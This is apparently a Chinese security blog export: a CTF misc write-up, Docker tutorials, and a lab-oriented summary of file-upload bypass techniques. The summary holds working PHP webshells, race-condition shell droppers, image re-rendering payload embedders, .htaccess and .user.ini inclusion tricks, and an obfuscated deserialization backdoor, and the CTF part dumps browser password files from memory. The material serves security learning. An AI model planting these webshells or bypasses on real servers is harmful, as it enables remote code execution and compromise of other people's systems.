15(1111)\n\n分组完成后我们就计算出每一组中序号对应的值中有几个1\n\n>第1组：5个\n>第2组：4个\n>第3组：5个\n>第4组：5个\n\n根据每组当中1的个数，我们就能计算出校验码的值，若为奇校验，则校验码为0010；若为偶校验，则校验码为1101\n编码后的结果如下\n\n>奇校验：101101100110110\n>偶校验：101101110111101\n\n\n[参考文章](http://migooli.top/2021/09/21/ctfshow_2021%E6%9C%88%E9%A5%BC%E6%9D%AF%E8%AE%B0%E5%BD%95/)","tags":["基础知识"],"categories":["linux"]},{"title":"【ctfshow】吃鸡杯-misc-wp","url":"/posts/81e3f8e/","content":"\n\n\n# Fortune Cookie #\n动态的misc题目,第一次见，挺有新意的\n图片下载后发现是png图片，那么就用tweakpng先查看crc\n报错了，但是图片能打开，所以是图片的宽高被改变了\n![](/img/ctfshow/cjb1.png)\n用脚本爆破图片的宽高\n```python\nimport struct\nimport binascii\nimport os\n\nm = open(\"flag.png\",\"rb\").read()\nk=0\nfor i in range(5000):\n    if k==1:\n        break\n    for j in range(5000):\n        c = m[12:16] + struct.pack('>i', i) + struct.pack('>i', j)+m[24:29]\n        crc = binascii.crc32(c) & 0xffffffff\n        if crc == 0x91918666:       //crc\n            k = 1\n            print(hex(i),hex(j))\n            break\n\n```\n将图片的宽高修改为爆破出来的值\n![](/img/ctfshow/cjb2.png)\n修改后再次用tweakpng查看图片的idat块\n发现第一个idat块很小，将这个块删除\n![](/img/ctfshow/cjb3.png)\n得到原始图片(放个小图，嘿嘿嘿，完整的大家自己做试试吧)\n![](/img/ctfshow/cjb4.png)\n用stegsolve查看，会发现3个颜色通道的0通道有\"异常\",保存下来\n仔细观察，会发现左上角存在有规律的偏移\n![](/img/ctfshow/cjb5.png)\n用stegsolve的stereogram solver功能进行偏移\n当偏移到20的时候出现了文字信息，提示已经很明显了，我们换个方向再次进行偏移\n![](/img/ctfshow/cjb6.png)\n我在偏移量为187的时候得到了flag\n\n# zipper, clipper, not need john the ripper #\n发现在windows下和linux下解压的内容不一样\n因为windows下的文件夹名是不区分大小写的，解压后会合并\n![](/img/ctfshow/cjb17.png)\n\n解压后共有58个，猜测是base58\n用脚本解，注意有几个字母是没有的\n```python\nimport os,base58\n\ntext = [''] * 1000\ndic = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'\n\nfor i in dic:\n    numlist = os.listdir(f'./file/{i}')\n    for j in numlist:\n        text[int(j)] = i\n\nt = base58.b58decode(''.join(text).encode()).decode()\nprint('ctfshow{' + t.split('{')[1].split('}')[0] + '}')\n```\n这个flag也是动态的\n![](/img/ctfshow/cjb18.png)\n\n# mumuzi的照片 #\n根据hint.png，首先爆破base64编码表\n脚本如下\n```python\nimport base64\nimport string\nfrom itertools import permutations\n\nwith open('im_not_tao_god.txt.encode','r')as f:\n    a=f.read()\n\nwith open('im_not_tao_god.txt','rb')as b:\n    b=base64.b64encode(b.read()).decode()\n\nwith open('mumuzi.rar.encode','r')as f:\n    timu=f.read()\n\nl=''\nk=''\nfor i in range(len(a)):\n    if a[i] not in l:\n        l=l+a[i]\n        k=k+b[i]\n\nd={}\nx=string.ascii_uppercase+string.ascii_lowercase+string.digits+\"+/=\"\n\nfor i in range(len(k)):\n    d[l[i]]=k[i]\nyuanwen=''\n\nfor i in x:\n    if i not in l:\n        yuanwen=yuanwen+i\n\n\nmiwen=''\nfor i in x:\n    if i not in k:\n       miwen=miwen+i\nprint(yuanwen,miwen)\n\nfor order in list(permutations(miwen,4)):\n    for i in range(len(yuanwen)):\n        d[yuanwen[i]]=order[i]\n    s=''\n    for j in timu:\n        s=s+d[j]\n    bs=base64.b64decode(s)\n    with open('output\\\\'+''.join(order)+'.rar','wb')as f:\n        f.write(bs)\n```\n爆破后得到一个真的压缩包，其他的压缩包是坏的\n![](/img/ctfshow/cjb19.png)\n解压后得到一个helloworld.txt和flag.rar\n在hint.png中可以得到flag.rar 的密码范围是0-1234\n![](/img/ctfshow/cjb20.png)\n用shell脚本爆破\n先生成密码字典，可以用crunch命令\n```\ncrunch 1 4 0123456789  >> passwd.txt\n```\n```\nwhile [ -f \"rars/flag.rar\" ]\ndo\n\tmv ./rars/flag.rar ./rars/flag_.rar\n\trar2john ./rars/flag_.rar >hash.txt\n\tjohn hash.txt --wordlist=passwd.txt\n\tpassword=`john hash.txt --show|head -n1|cut -d\":\" -f 2`\n\tunrar e -o+ ./rars/flag_.rar ./rars/ -p${password}\ndone\n```\n爆破了大概一个小时。。。结果还是假的\n最后得到的txt文件里写着：flag不在这里，你得往回走。\n![](/img/ctfshow/cjb22.png)\n\n观察最后的flag.rar得知rar文件是有注释的将所有注释提取出来\n\n根据txt的提示，flag得往回走，观察最后一段注释，发现是png文件头反过来，将所有注释连在一起然后reverse，得到png文件\n\n用010打开图片，CRC报错说明宽高被改过了，爆破出正确的宽度然后binwalk可以发现提示：我就知道你们只喜欢loli不喜欢我，我都穿成这样了你还不知道该对我（png，绝对不是mumuzi）做什么么？\n\n说明是brainfuck的brainloller模式，直接bftools一下这个图片就出来了bftools.exe decode brainloller mumuzi.png得到flag\n\n\n# 火烤大牛1.0 #\n\n补上PLTE和修改宽高即可\n\n\n# 信守着承诺 #\n根据提示找到一个信息\n>信守着承诺\n\n![](/img/ctfshow/cjb12.png)\n\n在文件中发现zip结构，用foremost分离后发现一个带密码的压缩包\n用歌词成功解压\n结尾处有一串base64加密的字符串\n解密后就是flag\n![](/img/ctfshow/cjb13.png)\n\n\n# 在？看看密码 #\n非预期解\n直接可以找到flag\n![](/img/ctfshow/cjb8.png)\n\n预期解\n利用volatility\n先imageinfo和pslist分析\n![](/img/ctfshow/cjb9.png)\n然后就是找密码了\n因为firefox的密码管理器db和json文件存放在Roaming\\Mozilla\\Firefox\\profiles\\xxxxxxx.default\\key4.db和logins.json。所以直接找这两个，然后用github的firefox密码查看器脚本或者用软件即可\n>先查看在下载\n>volatility -f looklookpassword.vmem --profile=Win7SP1x64 filescan |grep 'key4.db'\n>volatility -f looklookpassword.vmem --profile=Win7SP1x64 filescan |grep 'logins.json'\n>volatility -f looklookpassword.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000003d6ab4b0 -D ./\n>volatility -f looklookpassword.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000003ec70d00 -D ./\n\n![](/img/ctfshow/cjb10.png)\n拿到flag\n![](/img/ctfshow/cjb11.png)\n\n# qcode #\n解压得到很多个二维码图片\n使用脚本批量扫描\n```python\nimport pyzbar.pyzbar as pyzbar\nfrom PIL import Image\nimport os\nfrom tqdm import tqdm\npath = 'C:\\\\Users\\\\username\\\\Desktop\\\\qcode'\ntexts = ['']*9424\nlist = ['']*9424\ni = 0\nfor filename in os.listdir(path):\n    list[i] = filename\n    i += 1\nprint('目录文件获取完毕')\n\nfor i in tqdm(range(len(list))):\n    img = Image.open(path +'\\\\'+ list[i])\n    texts[i] = pyzbar.decode(img)\nprint('图像信息获取完毕')\ni = 0\nfor j in range(len(texts)):\n    for text in texts[j]:\n        tmp = text.data.decode(\"utf-8\")\n        if('ctfshow{' in tmp):\n            print('二维码 ' + list[j] + ' 解码出ctfshow：' + tmp)\n        if('flag{' in tmp):\n            print('二维码 ' + list[j] + ' 解码出flag：' + tmp)\n\n```\n得到一个假的flag\n![](/img/ctfshow/cjb14.png)\n发现这张图片中还带有zip\n用binwalk或foremost分离出来\n解压后有flaag.txt和glb两个文件\n[打开glb文件的百度经验](https://jingyan.baidu.com/article/3aed632e7634b731108091cf.html)\n改名为1.glb打开\n![](/img/ctfshow/cjb15.png)\n得到两串字符\n>The key:12\n\n>First kaisa second fence key\n\n打开flaag.txt\n开头是一个假的flag\n后面是大量的255，用脚本进行画图\n```python\nfrom PIL import Image\npic = Image.new(\"RGB\",(1000,1000))\nf = open(\"flaag.txt\",'r').readlines()\nfor i in range(len(f)):\n    s = f[i].split(',')\n    for j in range(len(s)):\n        if(s[j] == '255'):\n            pic.putpixel((j,i),(255,255,255))\n        elif s[j].find('\\n')>0:\n            pic.putpixel((j,i),(255,255,255))\n        else:\n            pic.putpixel((j,i),(0,0,0))\npic.save(\"qcode.png\")\n```\n得到这样一张图片\n![](/img/ctfshow/cjb16.png)\n然后根据key\n先[凯撒12](https://www.qqxiuzi.cn/bianma/kaisamima.php)，再[栅栏12](https://www.qqxiuzi.cn/bianma/zhalanmima.php)即可得到flag\n\n>od0dfmz_rf_Begfdtxtaam1nifex{u_qOaIy0zm}zefs_q\n>cr0rtan_ft_Psutrhlhooa1bwtsl{i_eCoWm0na}nstg_e     凯撒12\n>ctfshow{C0ngratulations_0n_th1s_Water_Problem}     栅栏12","tags":["wp","ctfshow"],"categories":["wp"]},{"title":"容器编排及环境部署","url":"/posts/145ae3c2/","content":"\n\n\n# Dockerfile和docker-compose.yml的区别 #\n\n## Dockerfile ##\nDockerfile是一个按一定规则编写的包含多行命令的文件，使用Dockerfile可以快速的构建一个定制的镜像。\n\n## docker-compose.yml ##\n使用docker-compose.yaml文件，按照特定的语法语句编写指令，管理多个镜像的部署和端口等操作，实现真证的快速部署。在不同服务器上部署时，只需要一个docker-compose.yaml文件，便能完成应用的部署操作。总之，Docker Compose是用来管理多个容器的。\n\n\n# 安装docker-compose #\n\n```\ncurl -L \"https://github.com/docker/compose/releases/download/1.25.0/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose     //下载docker-compose\n\nchmod +x /usr/local/bin/docker-compose        //赋予执行权限\n\ndocker-compose -version    //查看版本信息&是否安装成功\n```\n\n# Compose模板文件 #\n\nDocker-Compose标准模板文件应该包含version、services、networks 三大部分，最关键的是services和networks两个部分。\n```\nversion: '2'\nservices:\n  web:\n    image: dockercloud/hello-world\n    ports:\n      - 8080\n    networks:\n      - front-tier\n      - back-tier\n\n  redis:\n    image: redis\n    links:\n      - web\n    networks:\n      - back-tier\n\n  lb:\n    image: dockercloud/haproxy\n    ports:\n      - 80:80\n    links:\n      - web\n    networks:\n      - front-tier\n      - back-tier\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n\nnetworks:\n  front-tier:\n    driver: bridge\n  back-tier:\n    driver: bridge\n```\n下面解释几个常用的命令\n\n## version ##\n\nCompose目前有三个版本分别为Version 1，Version 2，Version 3，Compose区分Version 1和Version 2（Compose 1.6.0+，Docker Engine 1.10.0+）。Version 2支持更多的指令。Version 1将来会被弃用。\n\n## image ##\n\nimage是指定服务的镜像名称或镜像ID。如果镜像在本地不存在，Compose将会尝试拉取镜像。\n\n## build ##\n\n服务除了可以基于指定的镜像，还可以基于一份Dockerfile，在使用up启动时执行构建任务，构建标签是build，可以指定Dockerfile所在文件夹的路径。\n\n比如当前目录下有Dockerfile，docker-compose.yml 文件\n\n\n就会在当前目录下寻找Dockerfile文件进行自动构建镜像，然后使用镜像启动服务容器。\n\n\n## ports ##\n\nports用于映射端口的标签。\n\n\n## volumes ##\n\n数据卷，在它下面可以定义的数据卷（名字等等），然后挂载到不同的服务下去使用\n\n\n## networks ##\n\n应用的网络，在它下面可以定义应用的名字、使用的网络类型等等\n\n# Compose常用命令 #\n\n`docker-compose up`：启动服务，如果在后台启动需要参数-d\n`docker-compose stop [name]`：停止服务\n`docker-compose start [name]`：启动服务\n`docker-compose rm [name]`：删除服务，需要停止服务，否则使用-f参数，与docker rm命令类似\n`docker-compose down`：停止并删除容器，网络，镜像和数据卷\n`docker-compose logs -f [name]`：查看具体服务的日志","tags":["docker","基础知识"],"categories":["docker"]},{"title":"构建docker镜像并上传至hub","url":"/posts/6a4ce58/","content":"\n\n\n# 使用Dockerfile构建容器 #\n学习Dockerfile的最好方式就是阅读别人写的Dockerfile，遇到不会的指令就查一查Dockerfile的[文档](https://docs.docker.com/engine/reference/builder/)\n\n## 文件结构 ##\nDockerfile 一般分为 4 部分：基础镜像信息、维护者信息、镜像操作指令和容器启动时执行指令，“#”为 Dockerfile 中的注释。\nDockerfile 主要指令如下：\n```\nFROM：指定基础镜像，必须为第一个命令。\nMAINTAINER：维护者信息。\nRUN：构建镜像时执行的命令。\nADD：将本地文件添加到容器中，tar 类型文件会自动解压（网络压缩资源不会被解压），可以访问网络资源，类似 wget。\nCOPY：功能类似 ADD，但是是不会自动解压文件，也不能访问网络资源。\nCMD：构建容器后调用，也就是在容器启动时才进行调用。\nENTRYPOINT：配置容器，使其可执行化。配合 CMD 可省去“application”，只使用参数。\nLABEL：用于为镜像添加元数据。\nENV：设置环境变量。\nEXPOSE：指定与外界交互的端口。\nVOLUME：用于指定持久化目录。\nWORKDIR：工作目录，类似于 cd 命令。\nUSER：指定运行容器时的用户名或 UID，后续的 RUN 也会使用指定用户。使用 USER指定用户时，可以使用用户名、UID 或 GID，或是两者的组合。当服务不需要管理员权限时，可通过该命令指定运行用户。\nARG：用于指定传递给构建运行时的变量。\nONBUILD：用于设置镜像触发器。\n```\n接下来以 centos:latest 为基础镜像，安装 jdk1.8 并构建新的镜像 centos-jdk。\n例：\n```\n# CentOS with JDK 8\n# 指定基础镜像\nFROM centos\n# 指定作者\nMAINTAINER lewiserii\n# 新建文件夹用于存放 jdk 文件\nRUN mkdir /usr/local/java\n# 将 JDK 文件复制到镜像内并自动解压\nADD jdk-8.tar.gz /usr/local/java/\n# 创建软链接\nRUN ln -s /usr/local/java/jdk1.8.0_281 /usr/local/java/jdk\n# 设置环境变量\nENV JAVA_HOME=/usr/local/java/jdk\nENV JRE_HOME=${JAVA_HOME}/jre\nENV CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib\nENV PATH=${JAVA_HOME}/bin:$PATH\n```\n\n## 构建镜像 ##\n新建一个目录，然后在新目录下新建一个Dockerfile（注意D要大写）\n放入jdk的压缩包\n将你写好的内容复制进Dockerfile文件\n使用build构建镜像\n\n>docker build -t centos-jdk8:v1.0 .\n\n![](/img/docker/docker_hub-1.jpg)\n\n\n其中-t centos-jdk:v1.0表示打包的镜像名为centos-jdk，tag为v1.0（tag是可以任意命名的，不一定要是这种格式），注意命令的最后有一个.，这个表示打包的上下文（其实就是Dockerfile所在目录）是在当前目录，然后目录下的Dockerfile就会被编译执行。\n\n执行完毕后运行docker images就会发现多了一个centos-jdk镜像。\n\n![](/img/docker/docker_hub-2.jpg)\n\n可以先运行一下容器查看效果\n\n![](/img/docker/docker_hub-3.jpg)\n\n# 上传至docker hub #\n\n1:首先需要在[官网](https://hub.docker.com/)创建一个账户\n\n2:在docker中登陆\n>docker login -u 用户名 -p 密码\n\n![](/img/docker/docker_hub-4.jpg)\n\n3:将镜像命名你的用户名/镜像名这种形式，不然会push认证不通过\n>docker tag xxx:xxx 你的用户名/镜像名\n\n![](/img/docker/docker_hub-5.jpg)\n\n4：上传\n>docker push 你的用户名/镜像名\n\n![](/img/docker/docker_hub-6.jpg)\n\n5：登陆官网查看镜像信息\n在首页就可以看到啦，这样你就可以向你的朋友们分享你的镜像了\n![](/img/docker/docker_hub-7.jpg)\n\n6：删除hub镜像\n进入镜像后在settings中可以找到delete repository选项\n![](/img/docker/docker_hub-8.jpg)","tags":["docker","基础知识"],"categories":["docker"]},{"title":"关于文件上传的一点总结","url":"/posts/5c3aa540/","content":"\n# 前言 #\n\n部分靶场用的是国光师傅的[文件上传靶场项目](https://hub.docker.com/r/sqlsec/ggctf-upload) + upload-lab\n\n\n\n# JavaScript绕过\n\n\nF12可以很清楚的看到上传逻辑\n\n![](/img/summary/file_upload-1.jpg)\n\njs绕过的方法较多，抓包改后缀，禁用js或是直接修改代码\n\n访问chrome://settings/content/javascript?search=java\n\n![](/img/summary/file_upload-2.jpg)\n\n\n\n# MIME绕过\n\nMIME验证是对数据包的Content-Type类型进行验证\n我们只需要修改Content-Type类型即可绕过\n\n![](/img/summary/file_upload-3.jpg)\n\n常见的类型\n\n>text/plain（纯文本）\n>text/html（HTML文档）\n>text/javascript（js代码）\n>application/xhtml+xml（XHTML文档）\n>image/gif（GIF图像）\n>image/jpeg（JPEG图像）\n>image/png（PNG图像）\n>video/mpeg（MPEG动画）\n>application/octet-stream（二进制数据）\n>application/pdf（PDF文档）\n>application/(编程语言) 该种语言的代码\n>application/msword（Microsoft Word文件）\n>message/rfc822（RFC 822形式）\n>multipart/alternative（HTML邮件的HTML形式和纯文本形式，相同内容使用不同形式表示）\n>application/x-www-form-urlencoded（ POST方法提交的表单）\n>multipart/form-data（POST提交时伴随文件上传的表单）\n\n\n# 文件头绕过\n\n顾名思义，就是对文件头的验证\n用010 Editor等十六进制编辑器查看并修改\n\n![](/img/summary/file_upload-4.jpg)\n\n\n常见的文件头\n>PNG 的文件头为\n>89 50 4E 47 0D 0A 1A 0A\n\n>GIF(相当于文本的GIF89a)：\n>47 49 46 38 39 61\n\n>JPG 的文件头为\n>FF D8 FF E0 00 10 4A 46 49 46\n\n>ZIP 的文件头为\n>50 4B 03 04\n\n>RAR 的文件头为\n>52 61 72 21\n\n\n# 黑名单关键词替换绕过\n\n```php\n$blacklist = array(\"php\",\"php5\",\"php4\",\"php3\",\"phtml\",\"pht\",\"htaccess\");\n$name = str_ireplace($blacklist,\"\",$name);\nif (move_uploaded_file($_FILES['file']['tmp_name'],UPLOAD_PATH.$name))\n```\n\n黑名单关键词替换为空的操作是一种不安全的写法\n可以使用双写来绕过\n如test.phphpp\n\n\n# windows环境\n\n还是上一题的代码\n但是在windows环境下不区分大小写，所以就可以让 .PHp 当做 .php 来解析了，但是 Linux 下这种大小写如果的话完全没作用\n\n\n# 黑名单缺陷\n\n白名单是设置能通过的用户，白名单以外的用户都不能通过。\n黑名单是设置不能通过的用户，黑名单以外的用户都能通过。\n\n所以一般情况下白名单比黑名单限制的用户要更多一些\n这里利用的是php的多后缀\n默认情况下 Apache 把 phtml、pht、php、php3、php4、php5 解析为 PHP\n\n\n# .htaccess\n\n上传一个.htaccess文件，文件内容如下\n\n![](/img/summary/file_upload-5.jpg)\n\n意思是这个目录下的所有以.png为后缀的文件都会被解析为php执行\n然后上传一个1.png\n\n![](/img/summary/file_upload-6.jpg)\n\n访问上传的1.png\n执行成功\n\n![](/img/summary/file_upload-7.jpg)\n\n\n或者可以组合auto_append_file来绕过一些对内容的限制\n\n```php\nAddType application/x-httpd-php .aaa\nphp_value auto_append_file \"php://filter/convert.base64-decode/resource=1.aaa\"\n```\n\n\n## .htaccess 解析成图片\n\n方法一：\n```\n#define width 1337\n#define height 1337\n```\n\n方法二：\n\n在.htaccess前添加`x00x00x8ax39x8ax39`\nx00x00x8ax39x8ax39 是wbmp文件的文件头\n.htaccess中以0x00开头的同样也是注释符，所以不会影响.htaccess\n\n\n# 00截断--1\n\n想要利用00截断需要一些条件：\n>php版本要小于5.3.4，5.3.4及以上已经修复该问题\n>magic_quotes_gpc需要为OFF状态\n\n0x00，%00，/00之类的截断，都是一样的，只是不同表示而已\n\n上传1.png，并构造一个new.php\n即/upload/new.php%001.png，经过解析后1.png被截断\n\n![](/img/summary/file_upload-8.jpg)\n\n访问new.php\n执行成功\n\n![](/img/summary/file_upload-9.jpg)\n\n\n# 00截断--2\n\nPOST型的00截断\n需要手动解码一次\n\n![](/img/summary/file_upload-10.jpg)\n\n![](/img/summary/file_upload-11.jpg)\n\n\n# 条件竞争\n\n例子:先存储文件，再判断是否合法，然后又删除\n首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，典型的“引狼入室”\n\n攻击:首先上传一个php文件\n当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。\n\n\n`<?php fputs(fopen('xiao.php','w'),'<?php eval($_REQUEST[1]);?>');?>`\n\n利用burp的抓包和爆破功能即可实现条件竞争（或是利用脚本，如较为方便的python）\n将上传的shell无限发送，另一边无限访问这个shell，趁上传和删除的间隙生成webshell\n\n# move_uploaded_file绕过\n\n`move_uploaded_file($temp_file, $img_path)`\n>上述函数除了 PHP 5.3.4 以下的版本可以用 00 截断绕过，就真的没有其他缺陷了吗？\n\n当 \\$img_path 可控的时候，还会忽略掉 $img_path 后面的 /.\n\n梅子酒师傅的这篇[文章](https://meizjm3i.github.io/2018/04/17/%E4%BB%8E0CTF%E5%88%86%E6%9E%90move-uploaded-file%E5%87%BD%E6%95%B0%E7%9A%84%E4%B8%80%E4%B8%AA%E7%89%B9%E7%82%B9/)已经解释的很详细了\n\n![](/img/summary/file_upload-12.jpg)\n\n\n# 图片二次渲染绕过\n\n>imagecreatefrom 系列渲染图片都可能被绕过，有些特殊的图马是可以逃避过渲染的\n\n## GIF\n\n先上传一个GIF\n\n![](/img/summary/file_upload-gif.gif)\n\n1.gif是上传的\n2.gif是渲染后的\n使用010的文件比较功能，其中灰的部分就是内容一致的部分\n\n![](/img/summary/file_upload-13.jpg)\n\n将php代码插入到灰色部分之中即可\n\n![](/img/summary/file_upload-14.jpg)\n\n上传后再导出，发现php代码并没有被渲染掉\n\n![](/img/summary/file_upload-15.jpg)\n\n## PNG\n\n直接使用大牛的脚本了\n\n```php\n<?php\n$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,\n           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,\n           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,\n           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,\n           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,\n           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,\n           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,\n           0x66, 0x44, 0x50, 0x33);\n\n\n\n$img = imagecreatetruecolor(32, 32);\n\nfor ($y = 0; $y < sizeof($p); $y += 3) {\n   $r = $p[$y];\n   $g = $p[$y+1];\n   $b = $p[$y+2];\n   $color = imagecolorallocate($img, $r, $g, $b);\n   imagesetpixel($img, round($y / 3), 0, $color);\n}\n\nimagepng($img,'1.png');  //要修改的图片的路径\n/* 木马内容\n<?$_GET[0]($_POST[1]);?>\n */\n\n?>\n```\n用phpstudy等软件搭建一个本地环境运行即可\n把木马和脚本放在同一目录下，访问php即可\n\n## JPG\n\n同样直接放脚本\n\n```php\n<?php\n    $miniPayload = \"<?php system('tac f*');?>\";  //修改为需要的代码即可\n\n\n    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {\n        die('php-gd is not installed');\n    }\n\n    if(!isset($argv[1])) {\n        die('php jpg_payload.php <jpg_name.jpg>');\n    }\n\n    set_error_handler(\"custom_error_handler\");\n\n    for($pad = 0; $pad < 1024; $pad++) {\n        $nullbytePayloadSize = $pad;\n        $dis = new DataInputStream($argv[1]);\n        $outStream = file_get_contents($argv[1]);\n        $extraBytes = 0;\n        $correctImage = TRUE;\n\n        if($dis->readShort() != 0xFFD8) {\n            die('Incorrect SOI marker');\n        }\n\n        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {\n            $marker = $dis->readByte();\n            $size = $dis->readShort() - 2;\n            $dis->skip($size);\n            if($marker === 0xDA) {\n                $startPos = $dis->seek();\n                $outStreamTmp = \n                    substr($outStream, 0, $startPos) . \n                    $miniPayload . \n                    str_repeat(\"\\0\",$nullbytePayloadSize) . \n                    substr($outStream, $startPos);\n                checkImage('_'.$argv[1], $outStreamTmp, TRUE);\n                if($extraBytes !== 0) {\n                    while((!$dis->eof())) {\n                        if($dis->readByte() === 0xFF) {\n                            if($dis->readByte !== 0x00) {\n                                break;\n                            }\n                        }\n                    }\n                    $stopPos = $dis->seek() - 2;\n                    $imageStreamSize = $stopPos - $startPos;\n                    $outStream = \n                        substr($outStream, 0, $startPos) . \n                        $miniPayload . \n                        substr(\n                            str_repeat(\"\\0\",$nullbytePayloadSize).\n                                substr($outStream, $startPos, $imageStreamSize),\n                            0,\n                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . \n                                substr($outStream, $stopPos);\n                } elseif($correctImage) {\n                    $outStream = $outStreamTmp;\n                } else {\n                    break;\n                }\n                if(checkImage('payload_'.$argv[1], $outStream)) {\n                    die('Success!');\n                } else {\n                    break;\n                }\n            }\n        }\n    }\n    unlink('payload_'.$argv[1]);\n    die('Something\\'s wrong');\n\n    function checkImage($filename, $data, $unlink = FALSE) {\n        global $correctImage;\n        file_put_contents($filename, $data);\n        $correctImage = TRUE;\n        imagecreatefromjpeg($filename);\n        if($unlink)\n            unlink($filename);\n        return $correctImage;\n    }\n\n    function custom_error_handler($errno, $errstr, $errfile, $errline) {\n        global $extraBytes, $correctImage;\n        $correctImage = FALSE;\n        if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) {\n            if(isset($m[1])) {\n                $extraBytes = (int)$m[1];\n            }\n        }\n    }\n\n    class DataInputStream {\n        private $binData;\n        private $order;\n        private $size;\n\n        public function __construct($filename, $order = false, $fromString = false) {\n            $this->binData = '';\n            $this->order = $order;\n            if(!$fromString) {\n                if(!file_exists($filename) || !is_file($filename))\n                    die('File not exists ['.$filename.']');\n                $this->binData = file_get_contents($filename);\n            } else {\n                $this->binData = $filename;\n            }\n            $this->size = strlen($this->binData);\n        }\n\n        public function seek() {\n            return ($this->size - strlen($this->binData));\n        }\n\n        public function skip($skip) {\n            $this->binData = substr($this->binData, $skip);\n        }\n\n        public function readByte() {\n            if($this->eof()) {\n                die('End Of File');\n            }\n            $byte = substr($this->binData, 0, 1);\n            $this->binData = substr($this->binData, 1);\n            return ord($byte);\n        }\n\n        public function readShort() {\n            if(strlen($this->binData) < 2) {\n                die('End Of File');\n            }\n            $short = substr($this->binData, 0, 2);\n            $this->binData = substr($this->binData, 2);\n            if($this->order) {\n                $short = (ord($short[1]) << 8) + ord($short[0]);\n            } else {\n                $short = (ord($short[0]) << 8) + ord($short[1]);\n            }\n            return $short;\n        }\n\n        public function eof() {\n            return !$this->binData||(strlen($this->binData) === 0);\n        }\n    }\n?>\n```\n\n用法  php exp.php 1.png\n注意，要先上传渲染一次再进行脚本渲染\n我在本地环境试了好多张jpg图片，包括系统截图的，qq截图，网上下载图片等等方式，都没有成功\n不过国光师傅提供的这张图片倒是可以使用，不知道是啥问题\n\n![](/img/summary/file_upload-16.jpg)\n\n国光师傅的jpg总结\n\n![](/img/summary/file_upload-17.jpg)\n\n# .user.ini\n\n从.user.ini后补充一下靶场中没有提到的环境\n\n使用条件:\n对应目录下面有可执行的php文件\n\n.user.ini.它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。\n\n如果采用exif_imagetype()验证文件后缀，可以尝试上传.user.ini\n\n```\n//使用任意一条即可，这两个配置项相当于文件包含 require()\nauto_prepend_file = <filename> // 包含在文件头\nauto_append_file = <filename> // 包含在文件尾（遇到exit语句失效）\n```\n如果成功上传了.user.ini后直接上传图片马getshell即可\n\n\ntrick1：`auto_append_file`也支持伪协议的使用，例如`auto_append_file = php://input`\ntrick2：可以包含nginx日志，例如`auto_append_file = /var/log/nginx/access.log`，访问的时候在ua头写上一句话木马\n\n\n# 内容检测\n\n可以使用二分法来确定被检测的关键字\n\n第一种情况：检测php的关键标签，比如`<?php ?>`\n可以尝试使用其他标签，如：\n\n```php\n<script language=\"php\">\n eval($_POST[2333]);\n</script>\n```\n\n使用script标签对php版本有要求：`php < 7`\n\n或者使用短标签\n\n```php\n<?=eval($_REQUEST[1]);\n```\n\n再或者可以上传`.htaccess`文件来修改配置项\n\n例如\n\n```php\nAddType application/x-httpd-php .txt\nphp_value auto_append_file \"php://filter/convert.base64-decode/resource=1.txt\"\n```\n\n然后上传base64编码的txt文件即可\n\n\n\n第二种情况：检测危险函数等敏感内容\n可以使用免杀马等\n\n例如\n```php\n<?php\n\nif (isset($_POST['run'])) {\n  class HandShip {\n     public $name;\n     public $male;\n     function __destruct() {\n        $allin = $this->name;\n        $allin($this->male);\n     }\n  }\nif(md5($_POST['code'])=='ce61649168c4550c2f7acab92354dc6e'){\n\n  unserialize($_POST['run']);\n}\n}\n?>\n```\n\n使用方法`run=O:8:\"HandShip\":2:{s:4:\"name\";s:6:\"system\";s:4:\"male\";s:9:\"cat /home\";};&code=panda`\n\n\n\n\n# apache解析漏洞\n\n非常简单的一个漏洞\nApache默认一个文件可以有多个以点.分割的后缀，当右边的后缀无法识别，则继续向左识别\n上传`shell.php.asd`\nasd这个后缀无法解析，服务器就会认为后缀是.php，从而绕过\n\n\n该漏洞与Apache 、 php版本误关，属于用户配置不当造成的解析漏洞\n\n配置如下\n\n```php\n<FilesMatch \".+\\.ph(ar|p|tml)\">\n    SetHandler application/x-httpd-php\n</FilesMatch>\n```\n\n不在mime.types当中的都不认识\n\n```text\nWindows：/apche/conf/mine.types\nUbuntu：/etc/mime.types\n```\n\n# iis asp目录解析漏洞\n\n该解析漏洞形成原因是以*.asp命名的文件夹里面的文件都会被当作asp文件解析！\n\n# iis 分号漏洞\n\n*.asp;.jpg 像这种畸形文件名在“；”后面的直接被忽略，也就是说当成 *.asp文件执行。\n\n\n# nginx错误配置漏洞\n\n*该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞*\n\n1：由于`nginx.conf`的错误配置导致`nginx`把以`.php`结尾的文件交给`fastcgi`处理，为此可以构造`upload/1.png/1.php`（1.png是上传的文件，包含一句话木马）\n\n2：但是`fastcgi`在处理`1.php`文件时发现文件并不存在，这时`php.ini`配置文件中`cgi.fix_pathinfo=1`发挥作用，这项配置用于修复路径，如果当前路径不存在则采用上层路径。为此这里交由`fastcgi`处理的文件就变成了`/1.png`，最后将`1.png`的内容当成php解析\n\n\n# 超大文件名绕过\n\nContent-Disposition: form-data; name=”file”; 